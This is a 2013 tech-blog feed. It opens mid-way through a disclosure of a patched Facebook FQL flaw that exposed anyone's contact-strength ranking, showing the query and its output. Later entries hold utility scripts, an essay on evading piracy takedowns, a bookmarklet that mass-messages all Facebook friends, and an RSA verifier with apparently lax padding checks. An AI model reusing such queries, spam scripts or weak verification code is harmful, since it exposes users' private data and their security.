<p>These are a bunch of queries against the <code>user</code> table based on JOINs on the <code>messaging_favorite</code> and <code>friend</code> tables. This <code>friend</code> table is interesting: it holds all the friendships with their details, for example <strong><code>communication_rank</code></strong>. By fiddling around a bit with it I guessed that it is a rank of the <em>“strength”</em> of <code>uid1</code>’s friendship with <code>uid2</code>, probably the thing that decides who’s shown in your chat sidebar even when he’s offline.</p>

<p>The <a href="https://developers.facebook.com/docs/reference/fql/friend">docs</a> tell us that “[the access token owner is] the only user that this table can be queried for, the friends of friends cannot be retrieved”. Hmm. Should we trust the docs? Turns out, <strong>NO</strong>! ;)</p>

<p>Authenticating with our iOS app access token we can issue queries like</p>

<pre><code>SELECT uid2, communication_rank FROM friend WHERE uid1=1289695510 ORDER BY communication_rank DESC
</code></pre>

<p>for an arbitrary friend’s <code>uid1</code> (the above is the one of my favorite guinea pig, Anna) instead of just for ours. That queries return output like</p>

<pre><code>{ "uid2": "1234567890", "communication_rank": "2.4456558227539" },
{ "uid2": "4242424242", "communication_rank": "1.68115234375" },
{ "uid2": "1337133713", "communication_rank": "1.602783203125" },
...
</code></pre>

<p>that tells us with which users the target contacts most, maybe the most interesting and private bit of information after message logs. We don’t even need to be friends of that users!</p>

<h2 id="reporting-and-patching">Reporting and patching</h2>

<p>The first time I reported the issue through <a href="https://www.facebook.com/whitehat/report/">their form</a> it got dismissed, probably also because I didn’t explain it very well. After offering a real world example they confirmed and quickly patched it.</p>

<p>The report netted me a generous 4200$ bounty (delivered as a cool prepaid card, that is worth the withdrawal fee) and a mention on <a href="https://www.facebook.com/whitehat/thanks/">their thanks page</a> (a great, great CV builder), plus some pleasant compliments.</p>

<p class="img_center"><img src="http://filosottile.github.com/images/whitehat.png" alt="White Hat Bounty" /></p>

<p>Facebook offers a great example of how to run a Bug Bounty Program: assure the researcher that he’s being heard, offer him a direct contact (you get ticket-bound <em>Reply-To</em>s) by skilled people, reward him generously (even if, believe me or not, this is the most optional point), publicly thank him and finally let him feel that his work is appreciated.</p>

<h2 id="vulnerability-timeline">Vulnerability timeline</h2>

<table>
  <tbody>
    <tr>
      <td>1 gen 2013</td>
      <td><strong>Vulnerability discovered and bug report filed</strong></td>
    </tr>
    <tr>
      <td>7 gen 2013</td>
      <td>Test accounts POC sent</td>
    </tr>
    <tr>
      <td>18 gen 2013</td>
      <td>First dismissing reply received</td>
    </tr>
    <tr>
      <td>19 gen 2013</td>
      <td><strong>Better explanation and real-users POC sent</strong></td>
    </tr>
    <tr>
      <td>28 gen 2013</td>
      <td>Vulnerability confirmed and acknowledged</td>
    </tr>
    <tr>
      <td>~ 30 gen 2013</td>
      <td><strong>Vulnerability fixed</strong></td>
    </tr>
    <tr>
      <td>1 feb 2013</td>
      <td>Bounty awarded</td>
    </tr>
    <tr>
      <td>18 mar 2013</td>
      <td>Bounty paid</td>
    </tr>
    <tr>
      <td>26 apr 2013</td>
      <td>This public disclosure</td>
    </tr>
  </tbody>
</table>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Claimed a RECAP Aaron Swartz grant &#10150;]]></title>
      <link href="https://www.recapthelaw.org/2013/04/02/two-recap-grants-awarded-in-memory-of-aaron-swartz/"/>
    
    <updated>2013-04-04T21:40:00-04:00</updated>
    <id>http://filosottile.github.com/claimed-a-recap-aaron-swartz-grant</id>
    
      <content type="html"><![CDATA[<p>I’ve recently teamed up with a friend of mine, Alessio Palmero, to extend the reach of the <a href="https://www.recapthelaw.org/">RECAP</a> extension to the Appellate Courts documents and win a <a href="http://www.plainsite.org/aaronsw/index.html">grant</a> offered by PlainSite in memory of <a href="http://www.aaronsw.com/">Aaron Swartz</a>.</p>

<p>The Firefox (and now Chrome) extension intercepts public domain documents downloaded from the pay-walled legal archive <a href="http://www.pacer.gov/">PACER</a> and uploads them to the <a href="http://archive.org/">Internet Archive</a>. Freely available documents are then marked as such for the sake of a juster access to public records.</p>

<p>Details and comments in the linked blog post.</p>

<br><a href="http://filosottile.github.com/claimed-a-recap-aaron-swartz-grant/">Permalink</a>]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Offline storage on a RPi]]></title>
      <link href="http://filosottile.github.com/offline-storage-on-a-rpi/"/>
    
    <updated>2013-02-22T23:21:00-05:00</updated>
    <id>http://filosottile.github.com/offline-storage-on-a-rpi</id>
    
      <content type="html"><![CDATA[<p>The only really secure place for data is <strong>an <a href="https://en.wikipedia.org/wiki/Air_gap_(networking)">offline</a> computer</strong>.</p>

<p>A couple of use cases: <a href="http://wiki.debian.org/subkeys">store your primary <strong>GPG key</strong> offline</a>, without expire date, then generate a couple of subkeys with 1y expiration and use them day to day. This way you will need your primary key only to issue/revoke subkeys or to sign other people keys (and no need to waste all your signatures every time your key expire).
Or, <a href="http://bitcoinarmory.com/using-offline-wallets-in-armory/">create a cold wallet for <strong>Bitcoin</strong> with Armory</a> and authorize all transactions from the offline machine while monitoring them from the online one.
And there are much more examples of data best kept offline…</p>

<p>But not everybody has money and space to keep a rarely used computer around only to store a couple of keys.</p>

<p>My solution is to use a <strong>Raspberry Pi</strong> with a <em>dedicated SD card</em>. Budget: <strong>10$</strong> for the SD (every good nerd already has a RPi, right?). Space: negligible.</p>

<p>If you don’t know what a RPi is, <a href="http://www.raspberrypi.org/faqs">it is a credit card sized computer with Ethernet, USB, HDMI that costs 35$</a>. Now you either want to buy one or you stumbled here by accident.</p>

<p>It’s simple: just download <a href="http://www.raspbian.org/">Raspbian</a>, <strong>unplug Ethernet</strong>, install Gnupg and <a href="https://gist.github.com/FiloSottile/3646033">Armory</a> and transfer data with any USB key! <em>Finish!</em> And now you have highest grade security on the cheap.</p>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Programming isn't always easy &#10150;]]></title>
      <link href="http://blog.wizpert.com/programming-help/"/>
    
    <updated>2013-02-21T23:14:00-05:00</updated>
    <id>http://filosottile.github.com/programming-isnt-always-easy</id>
    
      <content type="html"><![CDATA[<p>Since about a month now I’m using the <a href="https://wizpert.com/filippovalsorda">Wizpert</a> platform to help people out with their programming problems. It has been a greatly gratifying experience.</p>

<p>Here is a guest post on their blog.</p>

<p><em>Some people say that with all the reference documentation available, programming is easy.</em> …</p>

<br><a href="http://filosottile.github.com/programming-isnt-always-easy/">Permalink</a>]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Decompressing Lempel-Ziv-Stac in Python]]></title>
      <link href="http://filosottile.github.com/decompressing-lempel-ziv-stac-in-python/"/>
    
    <updated>2013-01-29T12:06:00-05:00</updated>
    <id>http://filosottile.github.com/decompressing-lempel-ziv-stac-in-python</id>
    
      <content type="html"><![CDATA[<p>Lempel-Ziv-Stac is a simple (and a bit exotic) compression algorithm,
used on embedded devices, for example for config files, for example on routers,
for example on those that expose the config file on the public internet. Just sayin’…</p>

<p>There is not a Python implementation of it, so here is my Lempel-Ziv-Stac decompression routine.
<!-- more --></p>
<div><script src="https://gist.github.com/4663892.js"></script>
<noscript><pre><code>#!/usr/bin/env python
#-*- coding:utf-8 -*-

##############################################################
# Lempel-Ziv-Stac decompression
# BitReader and RingList classes
# 
# Copyright (C) 2011  Filippo Valsorda - FiloSottile
# filosottile.wiki gmail.com - www.pytux.it
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see &amp;lt;http://www.gnu.org/licenses/&amp;gt;.
# 
##############################################################

import collections

class BitReader:
    &quot;&quot;&quot;
    Gets a string or a iterable of chars (also mmap)
    representing bytes (ord) and permits to extract
    bits one by one like a stream
    &quot;&quot;&quot;
    def __init__(self, bytes):
        self._bits = collections.deque()
        
        for byte in bytes:
            byte = ord(byte)
            for n in xrange(8):
                self._bits.append(bool((byte &gt;&gt; (7-n)) &amp; 1))
            
    def getBit(self):
        return self._bits.popleft()
        
    def getBits(self, num):
        res = 0
        for i in xrange(num):
            res += self.getBit() &lt;&lt; num-1-i
        return res
        
    def getByte(self):
        return self.getBits(8)
        
    def __len__(self):
        return len(self._bits)
        
class RingList:
    &quot;&quot;&quot;
    When the list is full, for every item appended
    the older is removed
    &quot;&quot;&quot;
    def __init__(self, length):
        self.__data__ = collections.deque()
        self.__full__ = False
        self.__max__ = length

    def append(self, x):
        if self.__full__:
            self.__data__.popleft()
        self.__data__.append(x)
        if self.size() == self.__max__:
            self.__full__ = True

    def get(self):
        return self.__data__

    def size(self):
        return len(self.__data__)

    def maxsize(self):
        return self.__max__
        
    def __getitem__(self, n):
        if n &gt;= self.size():
            return None
        return self.__data__[n]
        
def LZSDecompress(data, window = RingList(2048)):
    &quot;&quot;&quot;
    Gets a string or a iterable of chars (also mmap)
    representing bytes (ord) and an optional
    pre-populated dictionary; return the decompressed
    string and the final dictionary
    &quot;&quot;&quot;
    reader = BitReader(data)
    result = ''
    
    while True:
        bit = reader.getBit()
        if not bit:
            char = reader.getByte()
            result += chr(char)
            window.append(char)
        else:
            bit = reader.getBit()
            if bit:
                offset = reader.getBits(7)
                if offset == 0:
                    # EOF
                    break
            else:
                offset = reader.getBits(11)
            
            lenField = reader.getBits(2)
            if lenField &lt; 3:
                lenght = lenField + 2
            else:
                lenField &lt;&lt;= 2
                lenField += reader.getBits(2)
                if lenField &lt; 15:
                    lenght = (lenField &amp; 0x0f) + 5
                else:
                    lenCounter = 0
                    lenField = reader.getBits(4)
                    while lenField == 15:
                        lenField = reader.getBits(4)
                        lenCounter += 1
                    lenght = 15*lenCounter + 8 + lenField
            
            for i in xrange(lenght):
                char = window[-offset]
                result += chr(char)
                window.append(char)
    
    return result, window</code></pre></noscript></div>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Why Mega WILL change the status quo]]></title>
      <link href="http://filosottile.github.com/why-mega-will-change-the-status-quo/"/>
    
    <updated>2013-01-19T19:23:00-05:00</updated>
    <id>http://filosottile.github.com/why-mega-will-change-the-status-quo</id>
    
      <content type="html"><![CDATA[<p><em>A response to <a href="https://dl.dropbox.com/u/4374976/random/megaless.html">this</a>
on the newly launched <a href="https://mega.co.nz">Mega</a>.</em></p>

<p>It is true that theoretically no sharing approach can solve the problem of being inspectable,
however what Mega does is <strong>eliminate the single point of failure</strong>.</p>

<p>What made sharing over Megaupload difficult and finally killed the service was that
MPAA and RIAA could pressure Mega to obtain access to their data
(remember that they had direct read and delete access to Mega* data),
fingerprint a bunch of files and take down those that matched pirate videos or tracks.</p>

<p><em>Now Mega encrypts client-side all the uploaded data, and gives you the key to store (and share) along with the URL.</em></p>

<p>How this changes the outcome, you ask? Simply stated, <strong>now MPAA and RIAA can’t do anything with access only to Mega infrastructure</strong>.</p>

<p>Obviously key (and URL sharing) is the weakest link in the chain. but consider the two following (common) scenarios:</p>

<h3 id="the-classic-pirate-moviemusic-forumblog">The classic pirate movie/music forum/blog</h3>

<p>The users of those sites always re-uploaded all the content,
as taking the links of another community was considered really unkind and prevented in various ways.</p>

<p>However, all the copies were easy to kill at once by fingerprinting.</p>

<p>Now, instead, a MPAA/RIAA employee (or program) would have to scan through all those disperse, ephemeral and registration-based communities,
in a giant struggle that never comes to an end.</p>

<p>This because <strong>each community will have its own copy of the data, each one requiring its key to be taken down, and each key will have to be fetched from each particular site</strong>.</p>

<p>Do you want to be sure that no one will take down your link? Put it (and its key) behind a CAPTCHA.
This way an automated program will not suffice and they’ll not have enough human resources to check all the forums, blogs, etc.</p>

<h3 id="the-underground-textual-community">The underground textual community</h3>

<p>Let’s say an IRC channel, but also a Skype group chat or Facebook group might work (although I would never share pirate stuff along with my name and surname, but …).</p>

<p>Ever tried sharing big amounts of data over those services? It’s a pain. And sharing with a number of people is plainly impossible.</p>

<p>But now, <strong>one simply upload to Mega the file, and then share link+key with his closed group, and the only way to prevent this is to <em>be part</em> of that group</strong>.</p>

<blockquote>
  <p>This time I have the feeling that the bad guys win.</p>
</blockquote>

<p>P.S. I know that <a href="http://www.matasano.com/articles/javascript-cryptography/">JavaScript crypto is doomed</a> but they are not going to MitM your connection to steal your Mega keys, really.</p>

<p>P.P.S. If you read this far, you might enjoy <a href="https://twitter.com/FiloSottile">following me on Twitter</a></p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Archive your GitHub repo and data]]></title>
      <link href="http://filosottile.github.com/archive-your-github-repo-and-data/"/>
    
    <updated>2013-01-14T23:17:00-05:00</updated>
    <id>http://filosottile.github.com/archive-your-github-repo-and-data</id>
    
      <content type="html"><![CDATA[<p>GitHub is a service we all trust, so this is not a “get your data off that cloud before it explodes!”-style post,
but sometimes you want to take an offline copy of your or somebody’s work.</p>

<p>Here is a quick and dirty Python script that will help you clone all the repositories, the Gists and some metadata
that can be fetched over the API.
Be warned, it only fetches public repos and data and there’s no error checking.</p>

<div><script src="https://gist.github.com/4710058.js?file=usage.txt"></script>
<noscript><pre><code>usage: gh_dump.py [-h] [--forks] [--no-gist] [--no-metadata] username

Dump an user's public GitHub data into current directory.

positional arguments:
  username       the GH username

optional arguments:
  -h, --help     show this help message and exit
  --forks        git clone also forks (default is don't)
  --no-gist      don't download user gists (default is do)
  --no-metadata  don't download user metadata (default is do)</code></pre></noscript></div>

<div><script src="https://gist.github.com/4710058.js?file=archive_GH.py"></script>
<noscript><pre><code>#!/usr/bin/env python3

# This is free and unencumbered software released into the public domain.

# Anyone is free to copy, modify, publish, use, compile, sell, or
# distribute this software, either in source code form or as a compiled
# binary, for any purpose, commercial or non-commercial, and by any
# means.

# In jurisdictions that recognize copyright laws, the author or authors
# of this software dedicate any and all copyright interest in the
# software to the public domain. We make this dedication for the benefit
# of the public at large and to the detriment of our heirs and
# successors. We intend this dedication to be an overt act of
# relinquishment in perpetuity of all present and future rights to this
# software under copyright law.

# THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
# OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
# ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
# OTHER DEALINGS IN THE SOFTWARE.

# For more information, please refer to &lt;http://unlicense.org/&gt;

import argparse
from urllib.request import urlopen
from subprocess import call
import json
import re
import os.path

parser = argparse.ArgumentParser(description='Dump an user\'s public GitHub data into current directory.')
parser.add_argument('user', metavar='username',
                   help='the GH username')
parser.add_argument('--forks', dest='forks', action='store_true',
                   help='git clone also forks (default is don\'t)')
parser.add_argument('--no-gist', dest='gists', action='store_false',
                   help='don\'t download user gists (default is do)')
parser.add_argument('--no-metadata', dest='metadata', action='store_false',
                   help='don\'t download user metadata (default is do)')

args = parser.parse_args()

def clear_url(url):
    return re.sub(r'\{[^\}]*\}', '', url)

data = urlopen('https://api.github.com/users/' + args.user).read()
user = json.loads(data.decode('utf-8'))
if args.metadata:
    with open('user.json', 'wb') as f:
        f.write(data)

data = urlopen(clear_url(user['repos_url'])).read()
repos = json.loads(data.decode('utf-8'))
if args.metadata:
    with open('repos.json', 'wb') as f:
        f.write(data)
for repo in repos:
    if not repo['fork']:
        call(['git', 'clone', repo['clone_url']])
    elif args.forks:
        if not os.path.exists('forks'):
            os.makedirs('forks')
        call(['git', 'clone', repo['clone_url'], os.path.join('forks', repo['name'])])

data = urlopen(clear_url(user['gists_url'])).read()
gists = json.loads(data.decode('utf-8'))
if args.metadata:
    with open('gists.json', 'wb') as f:
        f.write(data)
if args.gists:
    if not os.path.exists('gists'):
        os.makedirs('gists')
    for gist in gists:
        call(['git', 'clone', gist['git_pull_url'], os.path.join('gists', gist['id'])])

if args.metadata:
    for name in ['received_events', 'events', 'organizations', 'followers', 'starred', 'following', 'subscriptions']:
        data = urlopen(clear_url(user[name + '_url'])).read()
        with open(name + '.json', 'wb') as f:
            f.write(data)</code></pre></noscript></div>

<p><em>I wrote and used this to archive Aaron Swartz GitHub account on <a href="https://archive.org/details/aaronswGHarchive">archive.org</a>. R.I.P.</em></p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Automatically compile .less and .coffee files]]></title>
      <link href="http://filosottile.github.com/automatically-compile-less-and-coffee-files/"/>
    
    <updated>2013-01-12T00:25:00-05:00</updated>
    <id>http://filosottile.github.com/automatically-compile-less-and-coffee-files</id>
    
      <content type="html"><![CDATA[<p>This small python script makes use of <a href="http://packages.python.org/watchdog/"><code>watchdog</code></a> (and <a href="http://amoffat.github.com/sh/"><code>sh</code></a>) to monitor your code directory (recursively) and build <a href="http://lesscss.org/">less</a> and <a href="http://coffeescript.org">CoffeeScript</a> files upon edit.</p>

<p>Simply launch it from the relevant folder and it will work in the background.</p>

<p>It should be trivial to add minification (and linting, but I suggest linting in the editor) to the process.</p>

<div><script src="https://gist.github.com/4710041.js?file=watch_and_build.py"></script>
<noscript><pre><code>#!/usr/bin/env python2

import watchdog.events
import watchdog.observers
import sh
import time
import os

# Detach
if os.fork(): os._exit(0)

coffee = sh.coffee.bake('-c')
less = sh.lessc

class Handler(watchdog.events.PatternMatchingEventHandler):
    def __init__(self):
        watchdog.events.PatternMatchingEventHandler.__init__(self, patterns=['*.less', '*.coffee'],
            ignore_directories=True, case_sensitive=False)

    def on_modified(self, event):
        if event.src_path.lower().endswith('.less'):
            try: less(event.src_path, event.src_path[:-5] + '.css')
            except sh.ErrorReturnCode_1 as e: print e.stderr
        if event.src_path.lower().endswith('.coffee'):
            try: coffee(event.src_path)
            except sh.ErrorReturnCode_1 as e: print e.stderr

    on_created = on_modified

if __name__ == &quot;__main__&quot;:
    event_handler = Handler()
    observer = watchdog.observers.Observer()
    observer.schedule(event_handler, path='.', recursive=True)
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()</code></pre></noscript></div>

<p>It requires <code>coffee</code> (<code>npm install coffee-script</code>) and <code>lessc</code> (<code>npm install less</code>).</p>

<p>Should be compatible with Mac OS X and Linux at least, BSD and Win… maybe.</p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[GitHub: checkout a pull request as a branch &#10150;]]></title>
      <link href="https://coderwall.com/p/z5rkga"/>
    
    <updated>2013-01-01T06:36:00-05:00</updated>
    <id>http://filosottile.github.com/github-checkout-a-pull-request-as-a-branch</id>
    
      <content type="html"><![CDATA[<p>Today looking at the Travis log of a Pull request build I saw this interesting command:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">git fetch origin +refs/pull/611/merge:</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Turns out that GitHub makes available from your main remote the PR branches as remote refs.</p>

<p>Also (discovered by blind guessing), if you change <code>/merge</code> with <code>/head</code> you get a ref to the clean PR head, unmerged with its target branch. What can be the most useful is up to you, I guess.</p>

<p>This is probably easy because GH on its side stores all the forks of a repo as the same Git repository.</p>

<p>An example in the Coderwall ProTip linked at the title.</p>
<br><a href="http://filosottile.github.com/github-checkout-a-pull-request-as-a-branch/">Permalink</a>]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Krumiro - send a message to all your Facebook friends]]></title>
      <link href="http://filosottile.github.com/krumiro-send-a-message-to-all-your-facebook-friends/"/>
    
    <updated>2012-12-22T19:20:00-05:00</updated>
    <id>http://filosottile.github.com/krumiro-send-a-message-to-all-your-facebook-friends</id>
    
      <content type="html"><![CDATA[<blockquote>
  <p><strong>Disclamer</strong>: this code is published without any guarantee, and <strong>the author is not responsible for any use or consequence deriving from its use</strong>.
By using it you are accepting this and you accept not to consider the author liable for your use.</p>

  <p>For the technically inclined, it’s all under <a href="http://filosottile.mit-license.org">MIT License</a>.</p>
</blockquote>

<p>This is a simple script allowing you to send a message to all your Facebook friends.</p>

<h3 id="features">Features</h3>
<ul>
  <li>Different messages for male and female friends;</li>
  <li>Replace <code>%name</code> with the name of the recipient in the messages (like <code>Hi %name! ...</code>);</li>
  <li>Configurable time to wait between a message and the next, with total duration prediction;</li>
  <li>List of friends to exclude.</li>
</ul>

<p>If you have any request or suggestion, simply leave a comment.</p>

<h3 id="installation">Installation</h3>
<ul>
  <li>Drag this “<a href="javascript:(function(d){var js, ref = d.getElementsByTagName('script')[0];js = d.createElement('script'); js.async = true;js.src = 'https://gist.github.com/raw/4215248/krumiro_en.js';ref.parentNode.insertBefore(js, ref);}(document));">Krumiro</a>” to your bookmarks bar;</li>
  <li>Done! Now the Krumiro button is ready.</li>
</ul>

<h3 id="use">Use</h3>
<ul>
  <li>While on a Facebook page, simply click it;</li>
  <li>Some windows asking you what to do will show up;</li>
  <li>The page will freeze until the script has finished, go grab a coffee, and maybe <a href="https://www.twitter.com">follow me on Twitter</a>.
<!-- more --></li>
</ul>

<h3 id="code-for-the-curious---its-ugly">Code (for the curious - it’s ugly)</h3>
<div><script src="https://gist.github.com/4215248.js?file=krumiro_en.js"></script>
<noscript><pre><code>var msg_m_prompt = 'Insert the message for males. I\'ll replace %name with the recipient name.';
var msg_f_prompt = 'Insert the message for females. I\'ll replace %name with the recipient name.';
var throttle_prompt = 'Insert the pause in milliseconds between a friend and the next.';
var exclude_prompt = 'Insert the list of friends to ignore, comma separated.';
var exerror_alert = '%s is not in your friends, you might have made a mistake. Do you want to continue?';
var time_alert = 'The script will take %s seconds!';
var done = 'Done!';

if(!Array.prototype.indexOf){Array.prototype.indexOf=function(d){if(void 0===this||null===this)throw new TypeError;var c=Object(this),b=c.length&gt;&gt;&gt;0;if(0===b)return-1;var a=0;0&lt;arguments.length&amp;&amp;(a=Number(arguments[1]),a!==a?a=0:0!==a&amp;&amp;(a!==1/0&amp;&amp;a!==-(1/0))&amp;&amp;(a=(0&lt;a||-1)*Math.floor(Math.abs(a))));if(a&gt;=b)return-1;for(a=0&lt;=a?a:Math.max(b-Math.abs(a),0);a&lt;b;a++)if(a in c&amp;&amp;c[a]===d)return a;return-1};}

function size(obj) {
    var s = 0, key;
    for (key in obj) {
        if (obj.hasOwnProperty(key)) s++;
    }
    return s;
}

function sleep(milliseconds) {
    var start = new Date().getTime();
    for (var i = 0; i &lt; 1e7; i++) {
        if ((new Date().getTime() - start) &gt; milliseconds){
          break;
        }
    }
}

function send(msg, to) {
    function serialize(obj) {
      var str = [];
      for(var p in obj)
         str.push(p + &quot;=&quot; + encodeURIComponent(obj[p]));
      return str.join(&quot;&amp;&quot;);
    }
    function random(len) {
        var min = Math.pow(10, len-1);
        var max = Math.pow(10, len);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    function generatePhstamp(qs, dtsg) {
        var input_len = qs.length;
        numeric_csrf_value='';

        for(var ii=0;ii&lt;dtsg.length;ii++) {
            numeric_csrf_value+=dtsg.charCodeAt(ii);
        }
        return '1' + numeric_csrf_value + input_len;
    }
    var fbid = window.require('Env').user;
    var d = new Date();
    var data = {
       &quot;message_batch[0][timestamp_relative]&quot;: &quot;&quot; + ('0'+d.getHours()).slice(-2) + &quot;:&quot; + ('0'+d.getMinutes()).slice(-2), 
       &quot;message_batch[0][author]&quot;: &quot;fbid:&quot; + fbid, 
       &quot;message_batch[0][is_cleared]&quot;: &quot;false&quot;, 
       &quot;message_batch[0][message_id]&quot;: &quot;&lt;&quot; + random(14) + &quot;:&quot; + random(10) + &quot;-&quot; + random(10) + &quot;@mail.projektitan.com&gt;&quot;, 
       &quot;message_batch[0][specific_to_list][0]&quot;: &quot;fbid:&quot; + to, 
       &quot;__user&quot;: fbid, 
       &quot;message_batch[0][timestamp_absolute]&quot;: &quot;Oggi&quot;, 
       &quot;message_batch[0][spoof_warning]&quot;: &quot;false&quot;, 
       &quot;message_batch[0][client_thread_id]&quot;: &quot;user:&quot; + to, 
       &quot;message_batch[0][source]&quot;: &quot;source:chat:web&quot;, 
       &quot;message_batch[0][has_attachment]&quot;: &quot;false&quot;, 
       &quot;message_batch[0][source_tags][0]&quot;: &quot;source:chat&quot;, 
       &quot;message_batch[0][body]&quot;: msg, 
       &quot;message_batch[0][is_filtered_content]&quot;: &quot;false&quot;, 
       &quot;message_batch[0][timestamp]&quot;: &quot;&quot; + Math.round(new Date().getTime() / 1000), 
       &quot;message_batch[0][is_unread]&quot;: &quot;false&quot;, 
       &quot;message_batch[0][action_type]&quot;: &quot;ma-type:user-generated-message&quot;, 
       &quot;__a&quot;: &quot;1&quot;, 
       &quot;message_batch[0][specific_to_list][1]&quot;: &quot;fbid:&quot; + fbid, 
       &quot;message_batch[0][html_body]&quot;: &quot;false&quot;, 
       &quot;message_batch[0][status]&quot;: &quot;0&quot;, 
       &quot;client&quot;: &quot;mercury&quot;, 
       &quot;message_batch[0][is_forward]&quot;: &quot;false&quot;, 
       &quot;fb_dtsg&quot;: window.require('Env').fb_dtsg
    };
    var req = serialize(data);
    // Thanks http://pastebin.com/VJAhUw30
    req += &quot;&amp;phstamp=&quot; + generatePhstamp(req, data.fb_dtsg);
    xmlhttp = new XMLHttpRequest();
    xmlhttp.open('POST', '/ajax/mercury/send_messages.php');
    xmlhttp.send(req);
}

function buddy(callback) {
    var xhr = new XMLHttpRequest();
    xhr.open(&quot;GET&quot;, &quot;https://www.facebook.com/ajax/chat/user_info_all.php?__user=&quot; + window.require('Env').user + &quot;&amp;__a=1&amp;viewer=&quot; + window.require('Env').user, true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        var resp = JSON.parse(xhr.responseText.slice(9));
        callback(resp.payload);
      }
    };
    xhr.send();
}

function spam() {
    var msg_m, msg_f, buddy_num, msg, pos = 1, throttle, exclude, present;
    buddy(function(buddy_list) {
        buddy_num = size(buddy_list);
        msg_m = prompt(msg_m_prompt);
        msg_f = prompt(msg_f_prompt);
        exclude = prompt(exclude_prompt).split(&quot;,&quot;);
        if (exclude.length == 1 &amp;&amp; exclude[0].trim() == '') exclude = Array();
        for (var i = 0; i &lt; exclude.length; i++) {
            present = false;
            for (var id in buddy_list)
                if (buddy_list[id].name == exclude[i].trim()) present = true;
            if (!present)
                if (!confirm(exerror_alert.replace('%s', exclude[i].trim()))) return;
        }
        throttle = +prompt(throttle_prompt);
        if (!confirm(time_alert.replace('%s', buddy_num*throttle/1000))) return;
        for (var id in buddy_list) {
            if (buddy_list[id].gender === 1) msg = msg_f;
            else msg = msg_m;
            msg = msg.replace('%name', buddy_list[id].firstName);
            // if (buddy_list[id].name == '') send(msg, id);
            if (exclude.indexOf(buddy_list[id].name) == -1) send(msg, id);
            if (pos % Math.floor(buddy_num/100) == 0) console.log(Math.floor(pos/(buddy_num/100)) + ' %');
            pos++;
            sleep(throttle);
        }
        alert(done);
    });
}

spam();</code></pre></noscript></div>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Please take this and go signing those updates]]></title>
      <link href="http://filosottile.github.com/please-take-this-and-go-signing-those-updates/"/>
    
    <updated>2012-12-19T20:47:00-05:00</updated>
    <id>http://filosottile.github.com/please-take-this-and-go-signing-those-updates</id>
    
      <content type="html"><![CDATA[<p>If your program does any sort of self-updating, it is <em>fundamental</em> that you <strong>check the update payload integrity</strong>. And no, fetching it over HTTPS might <a href="http://docs.python.org/2/library/urllib2.html">not</a> <a href="http://docs.python.org/3.3/library/urllib.request.html">be</a> <a href="http://www.rubyinside.com/how-to-cure-nethttps-risky-default-https-behavior-4010.html">enough</a>.</p>

<p>Otherwise, anyone who can tamper with the traffic of your users, like anyone on their same network, or their ISP, can trivially get <strong>code execution</strong> by modifying the update while your program downloads it. And yes, <a href="http://www.infobytesec.com/down/isr-evilgrade-Readme.txt">it is exploited in the wild and it is easy</a>.</p>

<p>The common way to sign something is to use RSA, but you might not want to rely on <em>yet another external dependency</em>, with God knows which license…<br />
Then, <strong>take this</strong>! It’s a drop-in, <em>zero-dependency</em> <strong>RSA signature verifying function</strong> that run on Python 2.4+ (seriously) and… it’s in the Public Domain (<a href="http://creativecommons.org/publicdomain/zero/1.0/">CC0</a>), it’s yours.</p>

<div><script src="https://gist.github.com/4340076.js?file=rsa_verify.py"></script>
<noscript><pre><code>def rsa_verify(message, signature, key):
    from struct import pack
    from hashlib import sha256 # You'll need the backport for 2.4 http://code.krypto.org/python/hashlib/
    from sys import version_info
    def b(x):
        if version_info[0] == 2: return x
        else: return x.encode('latin1')
    assert(type(message) == type(b('')))
    block_size = 0
    n = key[0]
    while n:
        block_size += 1
        n &gt;&gt;= 8
    signature = pow(int(signature, 16), key[1], key[0])
    raw_bytes = []
    while signature:
        raw_bytes.insert(0, pack(&quot;B&quot;, signature &amp; 0xFF))
        signature &gt;&gt;= 8
    signature = (block_size - len(raw_bytes)) * b('\x00') + b('').join(raw_bytes)
    if signature[0:2] != b('\x00\x01'): return False
    signature = signature[2:]
    if not b('\x00') in signature: return False
    signature = signature[signature.index(b('\x00'))+1:]
    if not signature.startswith(b('\x30\x31\x30\x0D\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20')): return False
    signature = signature[19:]
    if signature != sha256(message).digest(): return False
    return True</code></pre></noscript></div>

